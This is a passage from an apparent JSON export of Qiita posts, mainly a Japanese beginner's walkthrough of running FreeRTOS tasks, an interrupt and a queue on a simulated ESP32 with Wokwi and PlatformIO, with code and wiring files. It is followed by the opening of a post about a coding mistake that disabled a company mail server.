class=\"w\">\n  </span><span class=\"nl\">\"author\"</span><span class=\"p\">:</span><span class=\"w\"> </span><span class=\"s2\">\"Your Name\"</span><span class=\"p\">,</span><span class=\"w\">\n  </span><span class=\"nl\">\"editor\"</span><span class=\"p\">:</span><span class=\"w\"> </span><span class=\"s2\">\"wokwi\"</span><span class=\"p\">,</span><span class=\"w\">\n  </span><span class=\"nl\">\"parts\"</span><span class=\"p\">:</span><span class=\"w\"> </span><span class=\"p\">[</span><span class=\"w\">\n    </span><span class=\"p\">{</span><span class=\"w\">\n      </span><span class=\"nl\">\"type\"</span><span class=\"p\">:</span><span class=\"w\"> </span><span class=\"s2\">\"wokwi-esp32-devkit-v1\"</span><span class=\"p\">,</span><span class=\"w\">\n      </span><span class=\"nl\">\"id\"</span><span class=\"p\">:</span><span class=\"w\"> </span><span class=\"s2\">\"esp\"</span><span class=\"p\">,</span><span class=\"w\">\n      </span><span class=\"nl\">\"top\"</span><span class=\"p\">:</span><span class=\"w\"> </span><span class=\"mi\">0</span><span class=\"p\">,</span><span class=\"w\">\n      </span><span class=\"nl\">\"left\"</span><span class=\"p\">:</span><span class=\"w\"> </span><span class=\"mi\">0</span><span class=\"p\">,</span><span class=\"w\">\n      </span><span class=\"nl\">\"attrs\"</span><span class=\"p\">:</span><span class=\"w\"> </span><span class=\"p\">{}</span><span class=\"w\">\n    </span><span class=\"p\">},</span><span class=\"w\">\n    </span><span class=\"p\">{</span><span class=\"w\">\n      </span><span class=\"nl\">\"type\"</span><span class=\"p\">:</span><span class=\"w\"> </span><span class=\"s2\">\"wokwi-led\"</span><span class=\"p\">,</span><span class=\"w\">\n      </span><span class=\"nl\">\"id\"</span><span class=\"p\">:</span><span class=\"w\"> </span><span class=\"s2\">\"led1\"</span><span class=\"p\">,</span><span class=\"w\">\n      </span><span class=\"nl\">\"top\"</span><span class=\"p\">:</span><span class=\"w\"> </span><span class=\"mf\">172.8</span><span class=\"p\">,</span><span class=\"w\">\n      </span><span class=\"nl\">\"left\"</span><span class=\"p\">:</span><span class=\"w\"> </span><span class=\"mf\">230.6</span><span class=\"p\">,</span><span class=\"w\">\n      </span><span class=\"nl\">\"rotate\"</span><span class=\"p\">:</span><span class=\"w\"> </span><span class=\"mi\">180</span><span class=\"p\">,</span><span class=\"w\">\n      </span><span class=\"nl\">\"attrs\"</span><span class=\"p\">:</span><span class=\"w\"> </span><span class=\"p\">{</span><span class=\"w\">\n        </span><span class=\"nl\">\"color\"</span><span class=\"p\">:</span><span class=\"w\"> </span><span class=\"s2\">\"red\"</span><span class=\"w\">\n      </span><span class=\"p\">}</span><span class=\"w\">\n    </span><span class=\"p\">},</span><span class=\"w\">\n    </span><span class=\"p\">{</span><span class=\"w\">\n      </span><span class=\"nl\">\"type\"</span><span class=\"p\">:</span><span class=\"w\"> </span><span class=\"s2\">\"wokwi-resistor\"</span><span class=\"p\">,</span><span class=\"w\">\n      </span><span class=\"nl\">\"id\"</span><span class=\"p\">:</span><span class=\"w\"> </span><span class=\"s2\">\"r1\"</span><span class=\"p\">,</span><span class=\"w\">\n      </span><span class=\"nl\">\"top\"</span><span class=\"p\">:</span><span class=\"w\"> </span><span class=\"mf\">191.95</span><span class=\"p\">,</span><span class=\"w\">\n      </span><span class=\"nl\">\"left\"</span><span class=\"p\">:</span><span class=\"w\"> </span><span class=\"mf\">211.2</span><span class=\"p\">,</span><span class=\"w\">\n      </span><span class=\"nl\">\"rotate\"</span><span class=\"p\">:</span><span class=\"w\"> </span><span class=\"mi\">270</span><span class=\"p\">,</span><span class=\"w\">\n      </span><span class=\"nl\">\"attrs\"</span><span class=\"p\">:</span><span class=\"w\"> </span><span class=\"p\">{</span><span class=\"w\">\n        </span><span class=\"nl\">\"value\"</span><span class=\"p\">:</span><span class=\"w\"> </span><span class=\"s2\">\"220\"</span><span class=\"w\">\n      </span><span class=\"p\">}</span><span class=\"w\">\n    </span><span class=\"p\">},</span><span class=\"w\">\n    </span><span class=\"p\">{</span><span class=\"w\">\n      </span><span class=\"nl\">\"type\"</span><span class=\"p\">:</span><span class=\"w\"> </span><span class=\"s2\">\"wokwi-led\"</span><span class=\"p\">,</span><span class=\"w\">\n      </span><span class=\"nl\">\"id\"</span><span class=\"p\">:</span><span class=\"w\"> </span><span class=\"s2\">\"led2\"</span><span class=\"p\">,</span><span class=\"w\">\n      </span><span class=\"nl\">\"top\"</span><span class=\"p\">:</span><span class=\"w\"> </span><span class=\"mf\">134.4</span><span class=\"p\">,</span><span class=\"w\">\n      </span><span class=\"nl\">\"left\"</span><span class=\"p\">:</span><span class=\"w\"> </span><span class=\"mf\">230.6</span><span class=\"p\">,</span><span class=\"w\">\n      </span><span class=\"nl\">\"rotate\"</span><span class=\"p\">:</span><span class=\"w\"> </span><span class=\"mi\">180</span><span class=\"p\">,</span><span class=\"w\">\n      </span><span class=\"nl\">\"attrs\"</span><span class=\"p\">:</span><span class=\"w\"> </span><span class=\"p\">{</span><span class=\"w\">\n        </span><span class=\"nl\">\"color\"</span><span class=\"p\">:</span><span class=\"w\"> </span><span class=\"s2\">\"green\"</span><span class=\"w\">\n      </span><span class=\"p\">}</span><span class=\"w\">\n    </span><span class=\"p\">},</span><span class=\"w\">\n    </span><span class=\"p\">{</span><span class=\"w\">\n      </span><span class=\"nl\">\"type\"</span><span class=\"p\">:</span><span class=\"w\"> </span><span class=\"s2\">\"wokwi-resistor\"</span><span class=\"p\">,</span><span class=\"w\">\n      </span><span class=\"nl\">\"id\"</span><span class=\"p\">:</span><span class=\"w\"> </span><span class=\"s2\">\"r3\"</span><span class=\"p\">,</span><span class=\"w\">\n      </span><span class=\"nl\">\"top\"</span><span class=\"p\">:</span><span class=\"w\"> </span><span class=\"mf\">153.55</span><span class=\"p\">,</span><span class=\"w\">\n      </span><span class=\"nl\">\"left\"</span><span class=\"p\">:</span><span class=\"w\"> </span><span class=\"mf\">211.2</span><span class=\"p\">,</span><span class=\"w\">\n      </span><span class=\"nl\">\"rotate\"</span><span class=\"p\">:</span><span class=\"w\"> </span><span class=\"mi\">270</span><span class=\"p\">,</span><span class=\"w\">\n      </span><span class=\"nl\">\"attrs\"</span><span class=\"p\">:</span><span class=\"w\"> </span><span class=\"p\">{</span><span class=\"w\">\n        </span><span class=\"nl\">\"value\"</span><span class=\"p\">:</span><span class=\"w\"> </span><span class=\"s2\">\"220\"</span><span class=\"w\">\n      </span><span class=\"p\">}</span><span class=\"w\">\n    </span><span class=\"p\">},</span><span class=\"w\">\n    </span><span class=\"p\">{</span><span class=\"w\">\n      </span><span class=\"nl\">\"type\"</span><span class=\"p\">:</span><span class=\"w\"> </span><span class=\"s2\">\"wokwi-pushbutton\"</span><span class=\"p\">,</span><span class=\"w\">\n      </span><span class=\"nl\">\"id\"</span><span class=\"p\">:</span><span class=\"w\"> </span><span class=\"s2\">\"btn1\"</span><span class=\"p\">,</span><span class=\"w\">\n      </span><span class=\"nl\">\"top\"</span><span class=\"p\">:</span><span class=\"w\"> </span><span class=\"mf\">67.2</span><span class=\"p\">,</span><span class=\"w\">\n      </span><span class=\"nl\">\"left\"</span><span class=\"p\">:</span><span class=\"w\"> </span><span class=\"mf\">230.4</span><span class=\"p\">,</span><span class=\"w\">\n      </span><span class=\"nl\">\"rotate\"</span><span class=\"p\">:</span><span class=\"w\"> </span><span class=\"mi\">270</span><span class=\"p\">,</span><span class=\"w\">\n      </span><span class=\"nl\">\"attrs\"</span><span class=\"p\">:</span><span class=\"w\"> </span><span class=\"p\">{</span><span class=\"w\">\n        </span><span class=\"nl\">\"color\"</span><span class=\"p\">:</span><span class=\"w\"> </span><span class=\"s2\">\"blue\"</span><span class=\"w\">\n      </span><span class=\"p\">}</span><span class=\"w\">\n    </span><span class=\"p\">},</span><span class=\"w\">\n    </span><span class=\"p\">{</span><span class=\"w\">\n      </span><span class=\"nl\">\"type\"</span><span class=\"p\">:</span><span class=\"w\"> </span><span class=\"s2\">\"wokwi-resistor\"</span><span class=\"p\">,</span><span class=\"w\">\n      </span><span class=\"nl\">\"id\"</span><span class=\"p\">:</span><span class=\"w\"> </span><span class=\"s2\">\"r2\"</span><span class=\"p\">,</span><span class=\"w\">\n      </span><span class=\"nl\">\"top\"</span><span class=\"p\">:</span><span class=\"w\"> </span><span class=\"mf\">19.25</span><span class=\"p\">,</span><span class=\"w\">\n      </span><span class=\"nl\">\"left\"</span><span class=\"p\">:</span><span class=\"w\"> </span><span class=\"mi\">240</span><span class=\"p\">,</span><span class=\"w\">\n      </span><span class=\"nl\">\"rotate\"</span><span class=\"p\">:</span><span class=\"w\"> </span><span class=\"mi\">90</span><span class=\"p\">,</span><span class=\"w\">\n      </span><span class=\"nl\">\"attrs\"</span><span class=\"p\">:</span><span class=\"w\"> </span><span class=\"p\">{</span><span class=\"w\">\n        </span><span class=\"nl\">\"value\"</span><span class=\"p\">:</span><span class=\"w\"> </span><span class=\"s2\">\"10000\"</span><span class=\"w\">\n      </span><span class=\"p\">}</span><span class=\"w\">\n    </span><span class=\"p\">},</span><span class=\"w\">\n    </span><span class=\"p\">{</span><span class=\"w\">\n      </span><span class=\"nl\">\"type\"</span><span class=\"p\">:</span><span class=\"w\"> </span><span class=\"s2\">\"wokwi-pushbutton\"</span><span class=\"p\">,</span><span class=\"w\">\n      </span><span class=\"nl\">\"id\"</span><span class=\"p\">:</span><span class=\"w\"> </span><span class=\"s2\">\"btn2\"</span><span class=\"p\">,</span><span class=\"w\">\n      </span><span class=\"nl\">\"top\"</span><span class=\"p\">:</span><span class=\"w\"> </span><span class=\"mf\">28.8</span><span class=\"p\">,</span><span class=\"w\">\n      </span><span class=\"nl\">\"left\"</span><span class=\"p\">:</span><span class=\"w\"> </span><span class=\"mf\">230.4</span><span class=\"p\">,</span><span class=\"w\">\n      </span><span class=\"nl\">\"rotate\"</span><span class=\"p\">:</span><span class=\"w\"> </span><span class=\"mi\">270</span><span class=\"p\">,</span><span class=\"w\">\n      </span><span class=\"nl\">\"attrs\"</span><span class=\"p\">:</span><span class=\"w\"> </span><span class=\"p\">{</span><span class=\"w\">\n        </span><span class=\"nl\">\"color\"</span><span class=\"p\">:</span><span class=\"w\"> </span><span class=\"s2\">\"red\"</span><span class=\"w\">\n      </span><span class=\"p\">}</span><span class=\"w\">\n    </span><span class=\"p\">},</span><span class=\"w\">\n    </span><span class=\"p\">{</span><span class=\"w\">\n      </span><span class=\"nl\">\"type\"</span><span class=\"p\">:</span><span class=\"w\"> </span><span class=\"s2\">\"wokwi-resistor\"</span><span class=\"p\">,</span><span class=\"w\">\n      </span><span class=\"nl\">\"id\"</span><span class=\"p\">:</span><span class=\"w\"> </span><span class=\"s2\">\"r4\"</span><span class=\"p\">,</span><span class=\"w\">\n      </span><span class=\"nl\">\"top\"</span><span class=\"p\">:</span><span class=\"w\"> </span><span class=\"mf\">-19.15</span><span class=\"p\">,</span><span class=\"w\">\n      </span><span class=\"nl\">\"left\"</span><span class=\"p\">:</span><span class=\"w\"> </span><span class=\"mi\">240</span><span class=\"p\">,</span><span class=\"w\">\n      </span><span class=\"nl\">\"rotate\"</span><span class=\"p\">:</span><span class=\"w\"> </span><span class=\"mi\">90</span><span class=\"p\">,</span><span class=\"w\">\n      </span><span class=\"nl\">\"attrs\"</span><span class=\"p\">:</span><span class=\"w\"> </span><span class=\"p\">{</span><span class=\"w\">\n        </span><span class=\"nl\">\"value\"</span><span class=\"p\">:</span><span class=\"w\"> </span><span class=\"s2\">\"10000\"</span><span class=\"w\">\n      </span><span class=\"p\">}</span><span class=\"w\">\n    </span><span class=\"p\">}</span><span class=\"w\">\n  </span><span class=\"p\">],</span><span class=\"w\">\n  </span><span class=\"nl\">\"connections\"</span><span class=\"p\">:</span><span class=\"w\"> </span><span class=\"p\">[</span><span class=\"w\">\n    </span><span class=\"p\">[</span><span class=\"s2\">\"esp:TX0\"</span><span class=\"p\">,</span><span class=\"w\"> </span><span class=\"s2\">\"$serialMonitor:RX\"</span><span class=\"p\">,</span><span class=\"w\"> </span><span class=\"s2\">\"\"</span><span class=\"p\">,</span><span class=\"w\"> </span><span class=\"p\">[]],</span><span class=\"w\">\n    </span><span class=\"p\">[</span><span class=\"s2\">\"esp:RX0\"</span><span class=\"p\">,</span><span class=\"w\"> </span><span class=\"s2\">\"$serialMonitor:TX\"</span><span class=\"p\">,</span><span class=\"w\"> </span><span class=\"s2\">\"\"</span><span class=\"p\">,</span><span class=\"w\"> </span><span class=\"p\">[]],</span><span class=\"w\">\n    </span><span class=\"p\">[</span><span class=\"s2\">\"led1:A\"</span><span class=\"p\">,</span><span class=\"w\"> </span><span class=\"s2\">\"r1:1\"</span><span class=\"p\">,</span><span class=\"w\"> </span><span class=\"s2\">\"green\"</span><span class=\"p\">,</span><span class=\"w\"> </span><span class=\"p\">[</span><span class=\"s2\">\"v0\"</span><span class=\"p\">]],</span><span class=\"w\">\n    </span><span class=\"p\">[</span><span class=\"s2\">\"r1:2\"</span><span class=\"p\">,</span><span class=\"w\"> </span><span class=\"s2\">\"esp:D2\"</span><span class=\"p\">,</span><span class=\"w\"> </span><span class=\"s2\">\"green\"</span><span class=\"p\">,</span><span class=\"w\"> </span><span class=\"p\">[</span><span class=\"s2\">\"h0\"</span><span class=\"p\">]],</span><span class=\"w\">\n    </span><span class=\"p\">[</span><span class=\"s2\">\"led1:C\"</span><span class=\"p\">,</span><span class=\"w\"> </span><span class=\"s2\">\"esp:GND.1\"</span><span class=\"p\">,</span><span class=\"w\"> </span><span class=\"s2\">\"black\"</span><span class=\"p\">,</span><span class=\"w\"> </span><span class=\"p\">[</span><span class=\"s2\">\"v0\"</span><span class=\"p\">]],</span><span class=\"w\">\n    </span><span class=\"p\">[</span><span class=\"s2\">\"led2:A\"</span><span class=\"p\">,</span><span class=\"w\"> </span><span class=\"s2\">\"r3:1\"</span><span class=\"p\">,</span><span class=\"w\"> </span><span class=\"s2\">\"green\"</span><span class=\"p\">,</span><span class=\"w\"> </span><span class=\"p\">[</span><span class=\"s2\">\"v0\"</span><span class=\"p\">]],</span><span class=\"w\">\n    </span><span class=\"p\">[</span><span class=\"s2\">\"r3:2\"</span><span class=\"p\">,</span><span class=\"w\"> </span><span class=\"s2\">\"esp:D15\"</span><span class=\"p\">,</span><span class=\"w\"> </span><span class=\"s2\">\"green\"</span><span class=\"p\">,</span><span class=\"w\"> </span><span class=\"p\">[</span><span class=\"s2\">\"h0\"</span><span class=\"p\">]],</span><span class=\"w\">\n    </span><span class=\"p\">[</span><span class=\"s2\">\"led2:C\"</span><span class=\"p\">,</span><span class=\"w\"> </span><span class=\"s2\">\"esp:GND.1\"</span><span class=\"p\">,</span><span class=\"w\"> </span><span class=\"s2\">\"black\"</span><span class=\"p\">,</span><span class=\"w\"> </span><span class=\"p\">[</span><span class=\"s2\">\"v0\"</span><span class=\"p\">]],</span><span class=\"w\">\n    </span><span class=\"p\">[</span><span class=\"s2\">\"btn1:1.l\"</span><span class=\"p\">,</span><span class=\"w\"> </span><span class=\"s2\">\"esp:D4\"</span><span class=\"p\">,</span><span class=\"w\"> </span><span class=\"s2\">\"green\"</span><span class=\"p\">,</span><span class=\"w\"> </span><span class=\"p\">[</span><span class=\"s2\">\"h0\"</span><span class=\"p\">]],</span><span class=\"w\">\n    </span><span class=\"p\">[</span><span class=\"s2\">\"btn1:2.l\"</span><span class=\"p\">,</span><span class=\"w\"> </span><span class=\"s2\">\"esp:GND.2\"</span><span class=\"p\">,</span><span class=\"w\"> </span><span class=\"s2\">\"black\"</span><span class=\"p\">,</span><span class=\"w\"> </span><span class=\"p\">[</span><span class=\"s2\">\"h0\"</span><span class=\"p\">]],</span><span class=\"w\">\n    </span><span class=\"p\">[</span><span class=\"s2\">\"btn1:1.r\"</span><span class=\"p\">,</span><span class=\"w\"> </span><span class=\"s2\">\"r2:1\"</span><span class=\"p\">,</span><span class=\"w\"> </span><span class=\"s2\">\"red\"</span><span class=\"p\">,</span><span class=\"w\"> </span><span class=\"p\">[</span><span class=\"s2\">\"h0\"</span><span class=\"p\">]],</span><span class=\"w\">\n    </span><span class=\"p\">[</span><span class=\"s2\">\"r2:2\"</span><span class=\"p\">,</span><span class=\"w\"> </span><span class=\"s2\">\"esp:3V3\"</span><span class=\"p\">,</span><span class=\"w\"> </span><span class=\"s2\">\"red\"</span><span class=\"p\">,</span><span class=\"w\"> </span><span class=\"p\">[</span><span class=\"s2\">\"h0\"</span><span class=\"p\">]],</span><span class=\"w\">\n    </span><span class=\"p\">[</span><span class=\"s2\">\"btn2:1.l\"</span><span class=\"p\">,</span><span class=\"w\"> </span><span class=\"s2\">\"esp:D5\"</span><span class=\"p\">,</span><span class=\"w\"> </span><span class=\"s2\">\"green\"</span><span class=\"p\">,</span><span class=\"w\"> </span><span class=\"p\">[</span><span class=\"s2\">\"h0\"</span><span class=\"p\">]],</span><span class=\"w\">\n    </span><span class=\"p\">[</span><span class=\"s2\">\"btn2:2.l\"</span><span class=\"p\">,</span><span class=\"w\"> </span><span class=\"s2\">\"esp:GND.2\"</span><span class=\"p\">,</span><span class=\"w\"> </span><span class=\"s2\">\"black\"</span><span class=\"p\">,</span><span class=\"w\"> </span><span class=\"p\">[</span><span class=\"s2\">\"h0\"</span><span class=\"p\">]],</span><span class=\"w\">\n    </span><span class=\"p\">[</span><span class=\"s2\">\"btn2:1.r\"</span><span class=\"p\">,</span><span class=\"w\"> </span><span class=\"s2\">\"r4:1\"</span><span class=\"p\">,</span><span class=\"w\"> </span><span class=\"s2\">\"red\"</span><span class=\"p\">,</span><span class=\"w\"> </span><span class=\"p\">[</span><span class=\"s2\">\"h0\"</span><span class=\"p\">]],</span><span class=\"w\">\n    </span><span class=\"p\">[</span><span class=\"s2\">\"r4:2\"</span><span class=\"p\">,</span><span class=\"w\"> </span><span class=\"s2\">\"esp:3V3\"</span><span class=\"p\">,</span><span class=\"w\"> </span><span class=\"s2\">\"red\"</span><span class=\"p\">,</span><span class=\"w\"> </span><span class=\"p\">[</span><span class=\"s2\">\"h0\"</span><span class=\"p\">]]</span><span class=\"w\">\n  </span><span class=\"p\">]</span><span class=\"w\">\n</span><span class=\"p\">}</span><span class=\"w\">\n</span></code></pre></div>\n</div>\n<div class=\"code-frame\" data-lang=\"ini\" data-sourcepos=\"238:1-243:3\">\n<div class=\"code-lang\"><span class=\"bold\">platformio.ini</span></div>\n<div class=\"highlight\"><pre><code><span class=\"nn\">[env:esp32dev]</span><span class=\"w\">\n</span><span class=\"py\">platform</span><span class=\"w\"> </span><span class=\"p\">=</span><span class=\"w\"> </span><span class=\"s\">espressif32</span>\n<span class=\"py\">board</span><span class=\"w\"> </span><span class=\"p\">=</span><span class=\"w\"> </span><span class=\"s\">esp32dev</span>\n<span class=\"py\">framework</span><span class=\"w\"> </span><span class=\"p\">=</span><span class=\"w\"> </span><span class=\"s\">arduino</span>\n</code></pre></div>\n</div>\n<div class=\"code-frame\" data-lang=\"toml\" data-sourcepos=\"245:1-250:3\">\n<div class=\"code-lang\"><span class=\"bold\">wokwi.toml</span></div>\n<div class=\"highlight\"><pre><code><span class=\"k\">[</span><span class=\"n\">wokwi</span><span class=\"k\">]</span>\n<span class=\"n\">version</span> <span class=\"o\">=</span><span class=\"w\"> </span><span class=\"mi\">1</span>\n<span class=\"n\">firmware</span> <span class=\"o\">=</span><span class=\"w\"> </span><span class=\"s\">\".pio/build/esp32dev/firmware.bin\"</span>\n<span class=\"n\">elf</span> <span class=\"o\">=</span><span class=\"w\"> </span><span class=\"s\">\".pio/build/esp32dev/firmware.elf\"</span>\n</code></pre></div>\n</div>\n",
      "body": "VSCodeでWokwi,PlatformIOを使用し、シミュレータのみで実機も無しにESP32でのRT-OSを動作させた。\n\nArduino IDEと同じ。\n\n動作させたマシンはManjaro Linux\n関係ないけど、WMは i3\n\n\n![1765257964.png](https://qiita-image-store.s3.ap-northeast-1.amazonaws.com/0/3937994/a72f6c81-2eed-4409-ae49-f1bace54a841.png)\n\n\n```_1strtos_9C25.cpp\n#include <Arduino.h>\n\n// vvv ArduinoIDEでは↓は記述する必要は無いが明示的に書いておく\n#include <freertos/FreeRTOS.h>\n#include <freertos/task.h>\n#include <freertos/queue.h>\n\nconst int BUTTON_PIN = 4; // ボタン/入力に使用するピン (GPIO4)ニャ\nconst int LED_PIN = 2;    // LED/出力に使用するピン (GPIO2)ニャ\n\nTaskHandle_t    sw_tskh ;\nTaskHandle_t    led_tskh ;\nQueueHandle_t sw_q ;\n\n// ↓Arduino IDEだが、ESP32ではプロトタイプ宣言がないとcompile errorになった\nvoid led_taskf(void *parameter);\nvoid warikomi_go();\n\nvoid setup() {\n\n  pinMode(LED_PIN, OUTPUT);\n  pinMode(BUTTON_PIN, INPUT);\n\n  xTaskCreate(\n    led_taskf , //function\n    \"tact sw input task\", \n    1024 , \n    NULL, // parameter\n    12, \n    &led_tskh\n  );\n \n  sw_q = xQueueCreate(1, sizeof(byte));\n\n  warikomi_go() ;\n  Serial.begin(115200); // シリアル通信を開始し、ボーレートを設定\n  Serial.println(\"Hello, World! from ESP32 WROVER\"); // 文字列をシリアルポートに出力\n}\n\nconst byte nandemo_ok = 0 ; //代入しないとCRASHする\n\n//kes uint32_t lcome = 0 ;\nvoid IRAM_ATTR sw_warikomif() {\n//  if( millis() < lcome )return ;\n//  lcome = millis() + 100 ;\n\n  BaseType_t changeTask_to_sentQ_ifUcan = pdFALSE; // 初期値を代入しないとCRASHする\n  detachInterrupt(digitalPinToInterrupt(BUTTON_PIN));//一旦 割り込み禁止\n //割り込みからこれは使用できない --> xQueueSend(led_taskh, nandemo_ok, 0) ;//queueがfullでも何もしない\n // ^^^ 0 queueがfullの時、1回だけその時間待機する。0ならすぐ帰る\n\n  xQueueSendFromISR(sw_q,&nandemo_ok,&changeTask_to_sentQ_ifUcan);\n}\n\nvoid warikomi_go()\n{ //  割り込みON\n  attachInterrupt(digitalPinToInterrupt(BUTTON_PIN), sw_warikomif, FALLING);\n}\n\nint couter ;\n\nvoid led_taskf(void *parameter)\n{\n  byte leds = 1 ,ledb = 0;\n  byte qrcv ;\n  byte hc = 0 ;\n  while( true )\n  {\n    //    vTaskDelay(pdMS_TO_TICKS(1000));\n    if (xQueueReceive(sw_q, &qrcv, 222) == pdPASS) \n    {\n      leds = 1-leds ;\n      Serial.printf(\"Switch led mode %d %d\\n\",leds,couter++);\n      ledb = 1 ;\n      hc = 3 ; // 222msec x 3\n    }else{\n      ledb = 1-ledb ;\n    }\n      // 受信成功ニャ\n    if( !leds )\n    {\n      ledb = 0 ; //消灯\n    }\n    \n    while( hc && digitalRead(BUTTON_PIN) )\n    {\n      hc -- ;\n      if( hc )break ;\n      warikomi_go() ; //割り込み ON\n      break ;\n    }\n\n    digitalWrite(LED_PIN , ledb );\n  }//...while - true \n}\n\nvoid loop() {\n  delay(100);\n  vTaskDelete(NULL); // 自身をKILL\n}\n\n/*\nLED1赤GPIO2\nLED2緑GPIO15\nスイッチ1青GPIO4\nスイッチ2赤GPIO5\n*/\n```\n\n接続は↓\n```diagram.json\n{\n  \"version\": 1,\n  \"author\": \"Your Name\",\n  \"editor\": \"wokwi\",\n  \"parts\": [\n    {\n      \"type\": \"wokwi-esp32-devkit-v1\",\n      \"id\": \"esp\",\n      \"top\": 0,\n      \"left\": 0,\n      \"attrs\": {}\n    },\n    {\n      \"type\": \"wokwi-led\",\n      \"id\": \"led1\",\n      \"top\": 172.8,\n      \"left\": 230.6,\n      \"rotate\": 180,\n      \"attrs\": {\n        \"color\": \"red\"\n      }\n    },\n    {\n      \"type\": \"wokwi-resistor\",\n      \"id\": \"r1\",\n      \"top\": 191.95,\n      \"left\": 211.2,\n      \"rotate\": 270,\n      \"attrs\": {\n        \"value\": \"220\"\n      }\n    },\n    {\n      \"type\": \"wokwi-led\",\n      \"id\": \"led2\",\n      \"top\": 134.4,\n      \"left\": 230.6,\n      \"rotate\": 180,\n      \"attrs\": {\n        \"color\": \"green\"\n      }\n    },\n    {\n      \"type\": \"wokwi-resistor\",\n      \"id\": \"r3\",\n      \"top\": 153.55,\n      \"left\": 211.2,\n      \"rotate\": 270,\n      \"attrs\": {\n        \"value\": \"220\"\n      }\n    },\n    {\n      \"type\": \"wokwi-pushbutton\",\n      \"id\": \"btn1\",\n      \"top\": 67.2,\n      \"left\": 230.4,\n      \"rotate\": 270,\n      \"attrs\": {\n        \"color\": \"blue\"\n      }\n    },\n    {\n      \"type\": \"wokwi-resistor\",\n      \"id\": \"r2\",\n      \"top\": 19.25,\n      \"left\": 240,\n      \"rotate\": 90,\n      \"attrs\": {\n        \"value\": \"10000\"\n      }\n    },\n    {\n      \"type\": \"wokwi-pushbutton\",\n      \"id\": \"btn2\",\n      \"top\": 28.8,\n      \"left\": 230.4,\n      \"rotate\": 270,\n      \"attrs\": {\n        \"color\": \"red\"\n      }\n    },\n    {\n      \"type\": \"wokwi-resistor\",\n      \"id\": \"r4\",\n      \"top\": -19.15,\n      \"left\": 240,\n      \"rotate\": 90,\n      \"attrs\": {\n        \"value\": \"10000\"\n      }\n    }\n  ],\n  \"connections\": [\n    [\"esp:TX0\", \"$serialMonitor:RX\", \"\", []],\n    [\"esp:RX0\", \"$serialMonitor:TX\", \"\", []],\n    [\"led1:A\", \"r1:1\", \"green\", [\"v0\"]],\n    [\"r1:2\", \"esp:D2\", \"green\", [\"h0\"]],\n    [\"led1:C\", \"esp:GND.1\", \"black\", [\"v0\"]],\n    [\"led2:A\", \"r3:1\", \"green\", [\"v0\"]],\n    [\"r3:2\", \"esp:D15\", \"green\", [\"h0\"]],\n    [\"led2:C\", \"esp:GND.1\", \"black\", [\"v0\"]],\n    [\"btn1:1.l\", \"esp:D4\", \"green\", [\"h0\"]],\n    [\"btn1:2.l\", \"esp:GND.2\", \"black\", [\"h0\"]],\n    [\"btn1:1.r\", \"r2:1\", \"red\", [\"h0\"]],\n    [\"r2:2\", \"esp:3V3\", \"red\", [\"h0\"]],\n    [\"btn2:1.l\", \"esp:D5\", \"green\", [\"h0\"]],\n    [\"btn2:2.l\", \"esp:GND.2\", \"black\", [\"h0\"]],\n    [\"btn2:1.r\", \"r4:1\", \"red\", [\"h0\"]],\n    [\"r4:2\", \"esp:3V3\", \"red\", [\"h0\"]]\n  ]\n}\n```\n\n```platformio.ini\n[env:esp32dev]\nplatform = espressif32\nboard = esp32dev\nframework = arduino\n```\n\n```wokwi.toml\n[wokwi]\nversion = 1\nfirmware = \".pio/build/esp32dev/firmware.bin\"\nelf = \".pio/build/esp32dev/firmware.elf\"\n```\n",
      "coediting": false,
      "comments_count": 0,
      "created_at": "2025-12-09T14:36:08+09:00",
      "group": null,
      "id": "bb4bf41a82202b65739e",
      "likes_count": 0,
      "private": false,
      "reactions_count": 0,
      "stocks_count": 0,
      "tags": [
        {
          "name": "PlatformIO",
          "versions": []
        },
        {
          "name": "RTOS",
          "versions": []
        },
        {
          "name": "ESP32",
          "versions": []
        },
        {
          "name": "Wokwi",
          "versions": []
        }
      ],
      "title": "初めてのRTOS (freeRTOS)",
      "updated_at": "2025-12-09T14:36:08+09:00",
      "url": "https://qiita.com/bezonata/items/bb4bf41a82202b65739e",
      "user": {
        "description": null,
        "facebook_id": null,
        "followees_count": 1,
        "followers_count": 1,
        "github_login_name": null,
        "id": "bezonata",
        "items_count": 22,
        "linkedin_id": null,
        "location": null,
        "name": "",
        "organization": null,
        "permanent_id": 3937994,
        "profile_image_url": "https://secure.gravatar.com/avatar/5c6a8be0944d5d175f8d3909cef60d21",
        "team_only": false,
        "twitter_screen_name": null,
        "website_url": null
      },
      "page_views_count": null,
      "team_membership": null,
      "organization_url_name": null,
      "slide": false,
      "_source": "trending_by_likes"
    },
    {
      "rendered_body": "<h1 data-sourcepos=\"1:1-1:74\">\n<span id=\"コードミスで自社メールサーバーを受信不能にした話\" class=\"fragment\"></span><a href=\"#%E3%82%B3%E3%83%BC%E3%83%89%E3%83%9F%E3%82%B9%E3%81%A7%E8%87%AA%E7%A4%BE%E3%83%A1%E3%83%BC%E3%83%AB%E3%82%B5%E3%83%BC%E3%83%90%E3%83%BC%E3%82%92%E5%8F%97%E4%BF%A1%E4%B8%8D%E8%83%BD%E3%81%AB%E3%81%97%E3%81%9F%E8%A9%B1\"><i class=\"fa fa-link\"></i></a>コードミスで自社メールサーバーを受信不能にした話</h1>\n<p data-sourcepos=\"3:1-3:86\"><em>― たった4行を書かなかったせいで会社のメールが全滅した ―</em></p>\n<p data-sourcepos=\"5:1-7:34\">この記事は<br>\n<strong><a href=\"https://qiita.com/advent-calendar/2025/yarakashi\">本番環境などでやらかしちゃった人 Advent Calendar 2025</a></strong><br>\nの <strong>9日目</strong> の記事です。</p>\n<p data-sourcepos=\"9:1-11:21\">今回は、<br>\n<strong>「4行の if 文を入れ忘れた結果、自社で契約しているメールサーバーを物理的に爆撃した話」</strong><br>\nを供養します。</p>\n<h2 data-sourcepos=\"13:1-13:15\">\n<span id=\"きっかけ\" class=\"fragment\"></span><a href=\"#%E3%81%8D%E3%81%A3%E3%81%8B%E3%81%91\"><i class=\"fa fa-link\"></i></a>きっかけ</h2>\n<p data-sourcepos=\"15:1-15:91\"><strong>「メールアドレスなしでもアカウント登録できるようにしたい」</strong></p>\n<p data-sourcepos=\"17:1-17:90\">もともと本サービスでは、初回登録時に以下の情報が必須でした。</p>\n<ul data-sourcepos=\"19:1-23:0\">\n<li data-sourcepos=\"19:1-19:23\">メールアドレス</li>\n<li data-sourcepos=\"20:1-20:17\">ユーザー名</li>\n<li data-sourcepos=\"21:1-21:8\">名前</li>\n<li data-sourcepos=\"22:1-23:0\">初回ログインパスワード（6桁）</li>\n</ul>\n<p data-sourcepos=\"24:1-24:57\">しかし、公的機関向けに提供する都合上、</p>\n<ul 